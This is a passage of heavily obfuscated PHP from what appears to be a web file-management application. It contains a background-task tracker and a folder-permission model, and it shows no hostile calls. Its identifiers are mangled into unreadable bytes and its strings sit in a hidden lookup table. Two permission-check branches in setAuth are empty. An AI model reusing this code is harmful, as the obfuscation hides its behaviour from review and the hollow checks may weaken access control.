$ò…«Ëë¨[1688]; CacheLock::lock($Çäå‡š‘); $–‹èšêä = Model($ò…«Ëë¨[476])->set($Ô§¤³‡Ó, $°•ªÑ«ø, $ò…«Ëë¨[1687]); CacheLock::unlock($Çäå‡š‘); return $–‹èšêä; } protected static function log($‹ÜÉ¨øß) { write_log($‹ÜÉ¨øß, $_SERVER[³½¬ÚË¯][1674]); } private static function cacheClear() { $çŠ¸“¸ =& $_SERVER[³½¬ÚË¯]; Cache::clearMemory(Model($çŠ¸“¸[476])->cacheKey($çŠ¸“¸[1687])); Cache::clearMemory(Model($çŠ¸“¸[476])->cacheKey($çŠ¸“¸[1689])); Model($çŠ¸“¸[1659])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\156\151\x6e\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($˜áäûæ, $…šú­¢ = '', $öÈ‰“§ù = 0, $˜‹£ŒõÖ = '') { $ —Ê‚ûù =& $_SERVER[³½¬ÚË¯]; if (self::get($˜áäûæ)) { return; } $this->task = array($ —Ê‚ûù[443] => $˜áäûæ, $ —Ê‚ûù[1690] => USER_ID, $ —Ê‚ûù[1587] => $˜‹£ŒõÖ, $ —Ê‚ûù[494] => $ —Ê‚ûù[12], $ —Ê‚ûù[33] => $…šú­¢, $ —Ê‚ûù[1107] => $ —Ê‚ûù[12], $ —Ê‚ûù[822] => $öÈ‰“§ù, $ —Ê‚ûù[1691] => 0, $ —Ê‚ûù[1692] => 0, $ —Ê‚ûù[1693] => 0, $ —Ê‚ûù[1694] => timeFloat(), $ —Ê‚ûù[1695] => 0, $ —Ê‚ûù[1696] => 0, $ —Ê‚ûù[1697] => 0, $ —Ê‚ûù[1698] => 0, $ —Ê‚ûù[786] => $ —Ê‚ûù[1646]); $GLOBALS[$ —Ê‚ûù[1699]] = 1; Hook::bind($ —Ê‚ûù[1650], array($this, $ —Ê‚ûù[1700])); Hook::bind($ —Ê‚ûù[1701], array($this, $ —Ê‚ûù[1702])); $this->startAfter(); Hook::trigger($ —Ê‚ûù[1703], $this->task); $this->task[$ —Ê‚ûù[1696]] = timeFloat(); } public function end($Ş™¸ššò = '') { $Õ©¯±¹’ =& $_SERVER[³½¬ÚË¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Õ©¯±¹’[1696]]) { self::valueSet($this->task[$Õ©¯±¹’[443]], !1); } $this->isEnd = !0; if ($Ş™¸ššò) { $this->task[$Õ©¯±¹’[494]] = $Ş™¸ššò; } self::log($Õ©¯±¹’[1704] . $this->task[$Õ©¯±¹’[443]] . $Õ©¯±¹’[1705] . sprintf($Õ©¯±¹’[887], timeFloat() - $this->task[$Õ©¯±¹’[1694]]) . $Õ©¯±¹’[1706]); Hook::unbind($Õ©¯±¹’[1650], array($this, $Õ©¯±¹’[1700])); Hook::unbind($Õ©¯±¹’[1701], array($this, $Õ©¯±¹’[1702])); $this->endAfter(); $•Æ °Şî = $this->task; $this->task = !1; Hook::trigger($Õ©¯±¹’[1707], $•Æ °Şî); } public function update($ğŠ²ıÀç = 0, $ã£ÜÕÊŠ = false) { $¸½ŠåÇõ =& $_SERVER[³½¬ÚË¯]; $Û¸Æñª =& $this->task; if (!$Û¸Æñª) { return; } $Û¸Æñª[$¸½ŠåÇõ[1691]] += $ğŠ²ıÀç; $Û¸Æñª[$¸½ŠåÇõ[1695]] = timeFloat(); if ($Û¸Æñª[$¸½ŠåÇõ[822]]) { if ($Û¸Æñª[$¸½ŠåÇõ[822]] < $Û¸Æñª[$¸½ŠåÇõ[1691]]) { $Û¸Æñª[$¸½ŠåÇõ[822]] = $Û¸Æñª[$¸½ŠåÇõ[1691]]; } $á–òµæ¨ = timeFloat() - $Û¸Æñª[$¸½ŠåÇõ[1694]] - $Û¸Æñª[$¸½ŠåÇõ[1697]]; if ($á–òµæ¨ <= 0) { $á–òµæ¨ = 0.001; } $Û¸Æñª[$¸½ŠåÇõ[1692]] = $Û¸Æñª[$¸½ŠåÇõ[1691]] / $Û¸Æñª[$¸½ŠåÇõ[822]]; $Û¸Æñª[$¸½ŠåÇõ[1693]] = $Û¸Æñª[$¸½ŠåÇõ[1691]] / $á–òµæ¨; if ($Û¸Æñª[$¸½ŠåÇõ[1692]] > 0) { $Û¸Æñª[$¸½ŠåÇõ[1698]] = $á–òµæ¨ * (1 - $Û¸Æñª[$¸½ŠåÇõ[1692]]) / $Û¸Æñª[$¸½ŠåÇõ[1692]]; } $Û¸Æñª[$¸½ŠåÇõ[1698]] = $Û¸Æñª[$¸½ŠåÇõ[1698]] <= 0 ? 0 : $Û¸Æñª[$¸½ŠåÇõ[1698]]; } $this->updateAfter(); $×ëúˆ‘ä = 0.2; if (timeFloat() - $Û¸Æñª[$¸½ŠåÇõ[1696]] < $×ëúˆ‘ä && !$ã£ÜÕÊŠ) { return; } $Çû·ê   = self::get($Û¸Æñª[$¸½ŠåÇõ[443]]); $ï¤ıÌ‡ = $Çû·ê  [$¸½ŠåÇõ[786]]; if ($ï¤ıÌ‡ == self::STATYS_KILL) { $ª˜õìèº = array($¸½ŠåÇõ[1708] => LNG($¸½ŠåÇõ[1709]), $¸½ŠåÇõ[1255] => !1); Cache::set($¸½ŠåÇõ[1710] . $this->task[$¸½ŠåÇõ[443]], $ª˜õìèº, 30); $this->onKill(); $this->end(); die; } else { if ($ï¤ıÌ‡ == self::STATYS_STOP) { $†ƒıÚ¼ = 2; $Çû·ê  [$¸½ŠåÇõ[1697]] += $†ƒıÚ¼; self::valueSet($Û¸Æñª[$¸½ŠåÇõ[443]], $Çû·ê  ); sleep($†ƒıÚ¼); $this->update(); return; } } $Û¸Æñª[$¸½ŠåÇõ[786]] = $ï¤ıÌ‡ ? $ï¤ıÌ‡ : $Û¸Æñª[$¸½ŠåÇõ[786]]; $Û¸Æñª[$¸½ŠåÇõ[1697]] = $Çû·ê  [$¸½ŠåÇõ[1697]] ? $Çû·ê  [$¸½ŠåÇõ[1697]] : 0; $Û¸Æñª[$¸½ŠåÇõ[1696]] = timeFloat(); Hook::trigger($¸½ŠåÇõ[1711], $Û¸Æñª); self::valueSet($Û¸Æñª[$¸½ŠåÇõ[443]], $Û¸Æñª); } public function onKillSet($ö×İ—¶, $‰ÈÄÏ×’ = array()) { $this->onKillCall = array($ö×İ—¶, $‰ÈÄÏ×’); } public function onKill() { $Ì±îºúÈ =& $_SERVER[³½¬ÚË¯]; self::log($Ì±îºúÈ[1704] . $this->task[$Ì±îºúÈ[443]] . $Ì±îºúÈ[1712]); Hook::trigger($Ì±îºúÈ[1713], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ºç·œ¤œ) { $şÛ—ºÑÉ =& $_SERVER[³½¬ÚË¯]; Cache::set($şÛ—ºÑÉ[1710] . $this->task[$şÛ—ºÑÉ[443]], $ºç·œ¤œ, 60); return $ºç·œ¤œ; } public static function get($õİÖé) { $€Ö¦šÜ„ =& $_SERVER[³½¬ÚË¯]; $¥¼‰€¨ = self::valueGet($õİÖé); if (is_array($¥¼‰€¨) && $¥¼‰€¨[$€Ö¦šÜ„[1714]]) { $ƒ‰—ƒ©Ş = ActionApply($¥¼‰€¨[$€Ö¦šÜ„[1714]], array($¥¼‰€¨)); $¥¼‰€¨ = is_array($ƒ‰—ƒ©Ş) ? $ƒ‰—ƒ©Ş : $¥¼‰€¨; } return $¥¼‰€¨; } public static function listData() { $ü­ûÄ = self::valueGet(); return array_sort_by($ü­ûÄ, $_SERVER[³½¬ÚË¯][1694], !0); } public static function kill($Ì€‡çí) { return self::changeStatus($Ì€‡çí, self::STATYS_KILL); } public static function stop($É¯æÛÆ“) { return self::changeStatus($É¯æÛÆ“, self::STATYS_STOP); } public static function restart($Ç‚¤š¶Û) { return self::changeStatus($Ç‚¤š¶Û, self::STATYS_RUNNING); } public static function killAll() { $°Óñ–ê =& $_SERVER[³½¬ÚË¯]; $ŸéÖÀßİ = self::listData(); foreach ($ŸéÖÀßİ as $”ğ¾ô¯³) { self::kill($”ğ¾ô¯³[$°Óñ–ê[443]]); } sleep(2); foreach ($ŸéÖÀßİ as $”ğ¾ô¯³) { self::valueSet($”ğ¾ô¯³[$°Óñ–ê[443]], !1); } } private static function changeStatus($½ÒÓÔ¬, $Á¡È‘úè) { $¦Ç„Î³  =& $_SERVER[³½¬ÚË¯]; $Ü…ÏÃ­ = self::valueGet($½ÒÓÔ¬); if (!$Ü…ÏÃ­) { return !1; } $Ü…ÏÃ­[$¦Ç„Î³ [786]] = $Á¡È‘úè; self::valueSet($½ÒÓÔ¬, $Ü…ÏÃ­); self::log($¦Ç„Î³ [1715] . $Ü…ÏÃ­[$¦Ç„Î³ [443]] . $¦Ç„Î³ [1716] . $Á¡È‘úè); return !0; } public static function valueGet($•´ñƒ¸à = false) { $îğºÒÕã =& $_SERVER[³½¬ÚË¯]; if ($•´ñƒ¸à) { $ÈÅ¨„ì¡ = Model($îğºÒÕã[488])->where(array($îğºÒÕã[94] => $•´ñƒ¸à, $îğºÒÕã[33] => $îğºÒÕã[1114]))->find(); return $ÈÅ¨„ì¡ ? json_decode($ÈÅ¨„ì¡[$îğºÒÕã[418]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($é¡ÇßÙŸ = false) { $âîáÔìü =& $_SERVER[³½¬ÚË¯]; $´Ãé¸›¤ = array($âîáÔìü[33] => $âîáÔìü[1114]); if ($é¡ÇßÙŸ) { $´Ãé¸›¤[$âîáÔìü[1690]] = $é¡ÇßÙŸ; } $‚ÒÓš€‹ = Model($âîáÔìü[488])->where($´Ãé¸›¤)->select(); $‚ÒÓš€‹ = $‚ÒÓš€‹ ? $‚ÒÓš€‹ : array(); foreach ($‚ÒÓš€‹ as $ÂÚû×ß¢ => $œô¨É‹‡) { $‚ÒÓš€‹[$ÂÚû×ß¢] = json_decode($œô¨É‹‡[$âîáÔìü[418]], !0); } return $‚ÒÓš€‹; } public static function valueSet($¡ÒãË†ƒ, $ı²óµ…) { $İíœû€× =& $_SERVER[³½¬ÚË¯]; if (!$ı²óµ…) { return Model($İíœû€×[488])->where(array($İíœû€×[94] => $¡ÒãË†ƒ, $İíœû€×[33] => $İíœû€×[1114]))->delete(); } $½ì»–Â = json_encode($ı²óµ…); if (!$½ì»–Â) { ob_start(); var_dump($ı²óµ…); $êòíŞ“× = ob_get_clean(); self::log($İíœû€×[1717] . json_encode_force($êòíŞ“×)); } if (!$¡ÒãË†ƒ || !$ı²óµ…[$İíœû€×[443]]) { return !1; } $»º‡áä‚ = array($İíœû€×[33] => $İíœû€×[1114], $İíœû€×[1690] => USER_ID, $İíœû€×[94] => $¡ÒãË†ƒ, $İíœû€×[418] => $½ì»–Â); $ãÍìğæñ = $İíœû€×[1718]; CacheLock::lock($ãÍìğæñ); Model($İíœû€×[488])->add($»º‡áä‚, array(), !0); CacheLock::unlock($ãÍìğæñ); } public static function log($ò°ä•–Å) { if (!GLOBAL_DEBUG) { return; } write_log($ò°ä•–Å, $_SERVER[³½¬ÚË¯][1719]); } } goto BæÛÓöÌ™º; DŠø£ìÍÙ: define($_SERVER[³½¬ÚË¯][285], 1); define($_SERVER[³½¬ÚË¯][286], 0); define($_SERVER[³½¬ÚË¯][287], 2); goto Dø¡Ò—Ğ°½; aòğØ‹¥Õ˜: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\143\x65\137\141\x75\164\x68"; public function getAuth($¿ãÜøâ) { $´­ß§ãÆ =& $_SERVER[³½¬ÚË¯]; $ï‡´æÏ² = $this->sourceAuthSelect($¿ãÜøâ); $ïÈ¶Š£Ù = array(); $¢«ïæ« = array(); $™ş¢ïÓŸ = 2 << 25; foreach ($ï‡´æÏ² as $Ú¢„Ğı—) { $¼åŠ¿íÅ = Model($´­ß§ãÆ[541])->listData($Ú¢„Ğı—[$´­ß§ãÆ[1992]]); if (!$¼åŠ¿íÅ) { continue; } $ïÈ¶Š£Ù[] = $Ú¢„Ğı—; $Ó¾ÏÍ”È = 0; if ($Ú¢„Ğı—[$´­ß§ãÆ[178]] == SourceModel::TYPE_GROUP) { $Ó¾ÏÍ”È = $™ş¢ïÓŸ * 2; } if ($Ú¢„Ğı—[$´­ß§ãÆ[178]] == SourceModel::TYPE_USER) { $Ó¾ÏÍ”È = $™ş¢ïÓŸ; } if ($Ú¢„Ğı—[$´­ß§ãÆ[178]] == SourceModel::TYPE_USER && $Ú¢„Ğı—[$´­ß§ãÆ[539]] == $´­ß§ãÆ[212]) { $Ó¾ÏÍ”È = 0; } $¢«ïæ«[] = $¼åŠ¿íÅ[$´­ß§ãÆ[455]] + $Ó¾ÏÍ”È; } array_multisort($¢«ïæ«, SORT_DESC, $ïÈ¶Š£Ù); return $ïÈ¶Š£Ù; } public function sourceAuthSelect($ Øş´î) { $Ò¡ÌÆó¯ =& $_SERVER[³½¬ÚË¯]; static $ŒñŒ£™ = array(); $ˆâË’ù· = is_array($ Øş´î) ? !1 : !0; if ($ˆâË’ù·) { $ Øş´î = array($ Øş´î); } $Å´â‡™ = array(); foreach ($ Øş´î as $Öó¸Æã) { if (isset($ŒñŒ£™[$Öó¸Æã])) { $Å´â‡™[$Öó¸Æã] = $ŒñŒ£™[$Öó¸Æã]; } } if (count($Å´â‡™) == count($ Øş´î)) { return $ˆâË’ù· ? $Å´â‡™[$ Øş´î[0]] : $Å´â‡™; } $âãß„’µ = $Ò¡ÌÆó¯[2069]; $«ã¯²§É = array($Ò¡ÌÆó¯[181] => array($Ò¡ÌÆó¯[7], $ Øş´î)); $êˆŠğõ = $this->field($âãß„’µ)->order($Ò¡ÌÆó¯[443])->where($«ã¯²§É)->select(); $¼ı€”ß« = array_to_keyvalue_group($êˆŠğõ, $Ò¡ÌÆó¯[181]); foreach ($ Øş´î as $Öó¸Æã) { $ŒñŒ£™[$Öó¸Æã] = $¼ı€”ß«[$Öó¸Æã] ? $¼ı€”ß«[$Öó¸Æã] : array(); } if ($ˆâË’ù·) { return $êˆŠğõ; } return $¼ı€”ß«; } public function setAuth($¨ºïÒ—Å, $Èğ‡˜¿) { $ÊõÓÄá§ =& $_SERVER[³½¬ÚË¯]; $²˜­‚¨å = Model($ÊõÓÄá§[1375])->sourceInfo($¨ºïÒ—Å); if (!$²˜­‚¨å) { return !1; } if ($²˜­‚¨å[$ÊõÓÄá§[178]] != SourceModel::TYPE_GROUP) { return !1; } $€Ê³¯Ò‚ = 1; $Şş˜ÑÊ‘ = $²˜­‚¨å[$ÊõÓÄá§[539]]; if ($Şş˜ÑÊ‘ != $€Ê³¯Ò‚) { $®§È»è’ = array($ÊõÓÄá§[1888] => $Şş˜ÑÊ‘); $ıú÷„õá = Model($ÊõÓÄá§[1978])->field($ÊõÓÄá§[1690])->where($®§È»è’)->select(); $ıú÷„õá = array_to_keyvalue($ıú÷„õá, $ÊõÓÄá§[12], $ÊõÓÄá§[1690]); } $µÂÑÈù = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¾ô¯Î° = array(); foreach ($Èğ‡˜¿ as $ƒ·¡“‰) { if (!in_array($ƒ·¡“‰[$ÊõÓÄá§[178]], $µÂÑÈù)) { show_json(LNG($ÊõÓÄá§[2070]), !1); } if ($Şş˜ÑÊ‘ != $€Ê³¯Ò‚) { if ($ƒ·¡“‰[$ÊõÓÄá§[178]] == SourceModel::TYPE_GROUP) { } if ($ƒ·¡“‰[$ÊõÓÄá§[539]] != 0 && !in_array($ƒ·¡“‰[$ÊõÓÄá§[539]], $ıú÷„õá)) { } } if ($ƒ·¡“‰[$ÊõÓÄá§[539]] == 0) { $ƒ·¡“‰[$ÊõÓÄá§[178]] = SourceModel::TYPE_USER; } $¾ô¯Î°[] = array($ÊõÓÄá§[181] => $¨ºïÒ—Å, $ÊõÓÄá§[178] => intval($ƒ·¡“‰[$ÊõÓÄá§[178]]), $ÊõÓÄá§[539] => intval($ƒ·¡“‰[$ÊõÓÄá§[539]]), $ÊõÓÄá§[1992] => intval($ƒ·¡“‰[$ÊõÓÄá§[1992]]) ? intval($ƒ·¡“‰[$ÊõÓÄá§[1992]]) : 0, $ÊõÓÄá§[2052] => intval($ƒ·¡“‰[$ÊõÓÄá§[2052]]) ? intval($ƒ·¡“‰[$ÊõÓÄá§[2052]]) : -1); } $this->where(array($ÊõÓÄá§[459] => $¨ºïÒ—Å))->delete(); $this->addAll($¾ô¯Î°); return !0; } public function authClear($øï—Éğ) { $ç¬µªÍ =& $_SERVER[³½¬ÚË¯]; $¢“§‘ş„ = Model($ç¬µªÍ[1375])->sourceInfo($øï—Éğ); $áìÎ¤ÏÎ = array($øï—Éğ); if ($¢“§‘ş„[$ç¬µªÍ[453]] == $ç¬µªÍ[88]) { $ĞÒ´›ò¯ = array($ç¬µªÍ[621] => array($ç¬µªÍ[581], $¢“§‘ş„[$ç¬µªÍ[554]] . $øï—Éğ . $ç¬µªÍ[582])); $áìÎ¤ÏÎ = Model($ç¬µªÍ[1375])->field($ç¬µªÍ[459])->where($ĞÒ´›ò¯)->getField($ç¬µªÍ[181], !0); $áìÎ¤ÏÎ[] = $øï—Éğ; } $this->where(array($ç¬µªÍ[459] => array($ç¬µªÍ[460], $áìÎ¤ÏÎ)))->delete(); return !0; } public function getAllChildren($“ºÔ†ã) { $Å÷•­ş¡ =& $_SERVER[³½¬ÚË¯]; $‘ÌúÙìˆ = Model($Å÷•­ş¡[1375])->sourceInfo($“ºÔ†ã); if ($‘ÌúÙìˆ[$Å÷•­ş¡[453]] != $Å÷•­ş¡[88]) { return $this->sourceListAuth(array($“ºÔ†ã)); } if ($‘ÌúÙìˆ[$Å÷•­ş¡[178]] != SourceModel::TYPE_GROUP) { return array(); } $îƒ®ñ™ = 1; $Í÷ÎÚ„ = array($“ºÔ†ã); if ($‘ÌúÙìˆ[$Å÷•­ş¡[180]] == $Å÷•­ş¡[212] && $‘ÌúÙìˆ[$Å÷•­ş¡[539]] != $îƒ®ñ™) { $Í÷ÎÚ„ = $this->groupChidldAllRootSource($‘ÌúÙìˆ[$Å÷•­ş¡[539]]); } $ùşÅ™À = $this->field($Å÷•­ş¡[181])->group($Å÷•­ş¡[181])->select(); $ùşÅ™À = array_to_keyvalue($ùşÅ™À, $Å÷•­ş¡[12], $Å÷•­ş¡[181]); if (!$ùşÅ™À) { return array(); } $üÇÅçşË = $Å÷•­ş¡[2071]; $ĞÈ’½ß = array($Å÷•­ş¡[181] => array($Å÷•­ş¡[7], $ùşÅ™À), $Å÷•­ş¡[473] => $Å÷•­ş¡[212]); $ Õ›ò Å = Model($Å÷•­ş¡[861])->field($üÇÅçşË)->where($ĞÈ’½ß)->select(); $øÕşÀª³ = array($“ºÔ†ã); foreach ($ Õ›ò Å as $¯¯©ŠÏš) { foreach ($Í÷ÎÚ„ as $™»û÷¯Ş) { $”Ú¼¸ËÚ = $Å÷•­ş¡[50] . $™»û÷¯Ş . $Å÷•­ş¡[50]; $œ¶·’ê = $¯¯©ŠÏš[$Å÷•­ş¡[554]] . $¯¯©ŠÏš[$Å÷•­ş¡[181]] . $Å÷•­ş¡[50]; if (strstr($œ¶·’ê, $”Ú¼¸ËÚ)) { $øÕşÀª³[] = $¯¯©ŠÏš[$Å÷•­ş¡[181]]; break; } } } return $this->sourceListAuth($øÕşÀª³); } private function sourceListAuth($³ë½üÄ) { $ªİÓÌÏ² =& $_SERVER[³½¬ÚË¯]; $‚¼ïßˆñ = Model($ªİÓÌÏ²[1375])->sourceListInfo($³ë½üÄ, !0); $¶©ÁÎ±Ú = $this->sourceAuthSelect($³ë½üÄ); $æ„àöğ = array(); $øñ¶î¨­ = array(); foreach ($‚¼ïßˆñ as $ğ©œŒ“Ù) { unset($ğ©œŒ“Ù[$ªİÓÌÏ²[497]]); unset($ğ©œŒ“Ù[$ªİÓÌÏ²[495]]); unset($ğ©œŒ“Ù[$ªİÓÌÏ²[455]]); unset($ğ©œŒ“Ù[$ªİÓÌÏ²[87]]); $›Òêû¦ = $¶©ÁÎ±Ú[$ğ©œŒ“Ù[$ªİÓÌÏ²[181]]]; if (!$›Òêû¦) { continue; } $ğ©œŒ“Ù[$ªİÓÌÏ²[2072]] = $this->authTargetInfo($›Òêû¦); $ğ©œŒ“Ù[$ªİÓÌÏ²[552]] = rtrim($ğ©œŒ“Ù[$ªİÓÌÏ²[558]], $ªİÓÌÏ²[8]) . $ªİÓÌÏ²[8] . ltrim($ğ©œŒ“Ù[$ªİÓÌÏ²[552]], $ªİÓÌÏ²[8]); $æ„àöğ[] = $ğ©œŒ“Ù; $«ˆ¸ô»« = count(explode($ªİÓÌÏ²[8], trim($ğ©œŒ“Ù[$ªİÓÌÏ²[552]], $ªİÓÌÏ²[8]))); $øñ¶î¨­[] = $«ˆ¸ô»« + ($ğ©œŒ“Ù[$ªİÓÌÏ²[33]] == $ªİÓÌÏ²[75] ? 0 : 1000); } array_multisort($øñ¶î¨­, SORT_ASC, $æ„àöğ); return $æ„àöğ; } private function groupChidldAllRootSource($ÕŞÙÔß) { $Ñæïïö¸ =& $_SERVER[³½¬ÚË¯]; $¼ÁØäÊ„ = Model($Ñæïïö¸[2073])->groupChildrenAll($ÕŞÙÔß); $Á”à‡Öº = array($Ñæïïö¸[180] => 0, $Ñæïïö¸[539] => array($Ñæïïö¸[7], $¼ÁØäÊ„), $Ñæïïö¸[178] => SourceModel::TYPE_GROUP); $úËª»¿ú = Model($Ñæïïö¸[861])->field($Ñæïïö¸[181])->where($Á”à‡Öº)->select(); $úËª»¿ú = array_to_keyvalue($úËª»¿ú, $Ñæïïö¸[12], $Ñæïïö¸[181]); return $úËª»¿ú; } private function authTargetInfo($½õä€‹Ï) { $ÜÇú³¤¥ =& $_SERVER[³½¬ÚË¯]; $ü¡Šğ–× = array(); $Ôéğ¸¢Ó = array(); $¿³æˆ˜ = 2 << 25; foreach ($½õä€‹Ï as $Ê™ºäÆ) { $Â‘Ëú¸¨ = Model($ÜÇú³¤¥[541])->listData($Ê™ºäÆ[$ÜÇú³¤¥[1992]]); if (!$Â‘Ëú¸¨) { continue; } if ($Ê™ºäÆ[$ÜÇú³¤¥[178]] == SourceModel::TYPE_USER) { $à¬¿«æ = Model($ÜÇú³¤¥[547])->getInfoSimpleOuter($Ê™ºäÆ[$ÜÇú³¤¥[539]]); if ($à¬¿«æ[$ÜÇú³¤¥[1690]] == $ÜÇú³¤¥[1231]) { continue; } if ($à¬¿«æ[$ÜÇú³¤¥[1690]] == $ÜÇú³¤¥[212]) { $à¬¿«æ[$ÜÇú³¤¥[32]] = LNG($ÜÇú³¤¥[2074]); } } else { $à¬¿«æ = Model($ÜÇú³¤¥[555])->getInfoSimple($Ê™ºäÆ[$ÜÇú³¤¥[539]]); } if (!$à¬¿«æ) { continue; } $à¬¿«æ[$ÜÇú³¤¥[508]] = $Â‘Ëú¸¨; $ü¡Šğ–×[] = $à¬¿«æ; $²şş¬º­ = 0; if ($Ê™ºäÆ[$ÜÇú³¤¥[178]] == SourceModel::TYPE_GROUP) { $²şş¬º­ = $¿³æˆ˜ * 2; } if ($Ê™ºäÆ[$ÜÇú³¤¥[178]] == SourceModel::TYPE_USER) { $²şş¬º­ = $¿³æˆ˜; } if ($Ê™ºäÆ[$ÜÇú³¤¥[178]] == SourceModel::TYPE_USER && $Ê™ºäÆ[$ÜÇú³¤¥[539]] == $ÜÇú³¤¥[212]) { $²şş¬º­ = 0; } $Ôéğ¸¢Ó[] = $Â‘Ëú¸¨[$ÜÇú³¤¥[455]] + $²şş¬º­; } array_multisort($Ôéğ¸¢Ó, SORT_DESC, $ü¡Šğ–×); return $ü¡Šğ–×; } public function getAllChildrenByUser($œéá¨„, $›’ŒŒšÜ) { $­±Ãµ°‡ =& $_SERVER[³½¬ÚË¯]; $À…°²õ´ = Model($­±Ãµ°‡[568])->getInfo($›’ŒŒšÜ); if (!$›’ŒŒšÜ || !$œéá¨„ || !$À…°²õ´) { return array(); } $­¿«á—Ä = Model($­±Ãµ°‡[1375])->sourceInfo($œéá¨„); $Çå‚Š° = array(); $™½¯È« = 1; if ($­¿«á—Ä[$­±Ãµ°‡[180]] == $­±Ãµ°‡[212] && $­¿«á—Ä[$­±Ãµ°‡[539]] != $™½¯È« && $this->groupContainUser($­¿«á—Ä[$­±Ãµ°‡[539]], $›’ŒŒšÜ)) { foreach ($À…°²õ´[$­±Ãµ°‡[2075]] as $ş£’íí´) { $£ÚÏåª = Model($­±Ãµ°‡[555])->getInfo($ş£’íí´[$­±Ãµ°‡[1888]]); $Íê–Í¬‘ = Model($­±Ãµ°‡[568])->getInfoSimpleOuter($›’ŒŒšÜ); $Íê–Í¬‘[$­±Ãµ°‡[508]] = $ş£’íí´[$­±Ãµ°‡[455]]; if (Model($­±Ãµ°‡[541])->authCheckAction($ş£’íí´[$­±Ãµ°‡[455]][$­±Ãµ°‡[455]], $­±Ãµ°‡[1909])) { continue; } $—·ÅÎÎÙ = array($­±Ãµ°‡[32] => $­±Ãµ°‡[1251] . $£ÚÏåª[$­±Ãµ°‡[32]], $­±Ãµ°‡[181] => $£ÚÏåª[$­±Ãµ°‡[87]][$­±Ãµ°‡[181]], $­±Ãµ°‡[84] => KodIO::make($£ÚÏåª[$­±Ãµ°‡[87]][$­±Ãµ°‡[181]]), $­±Ãµ°‡[180] => $­±Ãµ°‡[212], $­±Ãµ°‡[178] => $­±Ãµ°‡[548], $­±Ãµ°‡[33] => $­±Ãµ°‡[585], $­±Ãµ°‡[552] => $£ÚÏåª[$­±Ãµ°‡[559]], $­±Ãµ°‡[1888] => $£ÚÏåª[$­±Ãµ°‡[1888]], $­±Ãµ°‡[556] => $£ÚÏåª[$­±Ãµ°‡[180]], $­±Ãµ°‡[2072] => array($Íê–Í¬‘)); $Çå‚Š°[$—·ÅÎÎÙ[$­±Ãµ°‡[181]]] = $—·ÅÎÎÙ; } } $§¦—ß¥ = array(); $€‚»àÆ¥ = $this->getAllChildren($œéá¨„); foreach ($€‚»àÆ¥ as $Üú«Ğ€) { $ª’ÍŞÛÀ = !1; foreach ($Üú«Ğ€[$­±Ãµ°‡[2072]] as $Û¥é¬êí) { if ($Û¥é¬êí[$­±Ãµ°‡[1690]]) { if ($Û¥é¬êí[$­±Ãµ°‡[1690]] == $›’ŒŒšÜ) { $ª’ÍŞÛÀ = !0; break; } } if ($Û¥é¬êí[$­±Ãµ°‡[1888]]) { if ($this->groupContainUser($Û¥é¬êí[$­±Ãµ°‡[1888]], $›’ŒŒšÜ)) { $ª’ÍŞÛÀ = !0; break; } } } if ($ª’ÍŞÛÀ) { $§¦—ß¥[] = $Üú«Ğ€; } $úš ‡œ = $Üú«Ğ€[$­±Ãµ°‡[181]]; if (isset($Çå‚Š°[$úš ‡œ])) { $Üú«Ğ€[$­±Ãµ°‡[2072]][] = $Çå‚Š°[$úš ‡œ][0]; $Çå‚Š°[$úš ‡œ] = !1; } } $Çå‚Š° = array_filter(array_values($Çå‚Š°)); $§¦—ß¥ = array_merge($Çå‚Š°, $§¦—ß¥); return $§¦—ß¥; } public function setAllChildrenByUser($ÃÓ›İ¦¦, $××æ·êÇ, $Ÿ»‘ƒÓ¶) { $­»â¯× =& $_SERVER[³½¬ÚË¯]; $Ïú…ÓÀ = $this->getAllChildrenByUser($ÃÓ›İ¦¦, $××æ·êÇ); if (!$Ÿ»‘ƒÓ¶ || !$Ïú…ÓÀ) { return !1; } foreach ($Ïú…ÓÀ as $¦â¸Óò) { $äÏÍŠÔ¶ = array(); foreach ($¦â¸Óò[$­»â¯×[2072]] as $Ö‚ùÜ ) { $ëä˜„É€ = $Ö‚ùÜ [$­»â¯×[508]]; $şâààœæ = $Ö‚ùÜ [$­»â¯×[1690]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ï§‰Ùø¹ = $Ö‚ùÜ [$­»â¯×[1690]] ? $Ö‚ùÜ [$­»â¯×[1690]] : $Ö‚ùÜ [$­»â¯×[1888]]; if ($Ö‚ùÜ [$­»â¯×[1690]] && $Ö‚ùÜ [$­»â¯×[1690]] == $××æ·êÇ) { continue; } $äÏÍŠÔ¶[] = array($­»â¯×[181] => $¦â¸Óò[$­»â¯×[181]], $­»â¯×[178] => $şâààœæ, $­»â¯×[539] => intval($Ï§‰Ùø¹), $­»â¯×[1992] => isset($ëä˜„É€[$­»â¯×[443]]) ? intval($ëä˜„É€[$­»â¯×[443]]) : 0, $­»â¯×[2052] => isset($ëä˜„É€[$­»â¯×[2052]]) ? intval($ëä˜„É€[$­»â¯×[2052]]) : -1); } $äÏÍŠÔ¶[] = array($­»â¯×[181] => $¦â¸Óò[$­»â¯×[181]], $­»â¯×[178] => SourceModel::TYPE_USER, $­»â¯×[539] => intval($××æ·êÇ), $­»â¯×[1992] => intval($Ÿ»‘ƒÓ¶), $­»â¯×[2052] => -1); $this->where(array($­»â¯×[459] => $¦â¸Óò[$­»â¯×[181]]))->delete(); $this->addAll($äÏÍŠÔ¶); } return !0; } public function get($ıÔ÷Á´Ü) { $ÊŸ¨û†› = $this->getSourceList(array($ıÔ÷Á´Ü), !0); return $ÊŸ¨û†›[0]; } public function getSourceList($å‰ÙüöË, $éßëÅ‘Í = false, $º²Ä€ß¼ = false) { $¢İÕ¢æÕ =& $_SERVER[³½¬ÚË¯]; if (!$å‰ÙüöË) { return array(); } $íÂîËŸ¡ = Model($¢İÕ¢æÕ[1375]); if (!$éßëÅ‘Í && count($å‰ÙüöË) == 1) { $éßëÅ‘Í = array(); 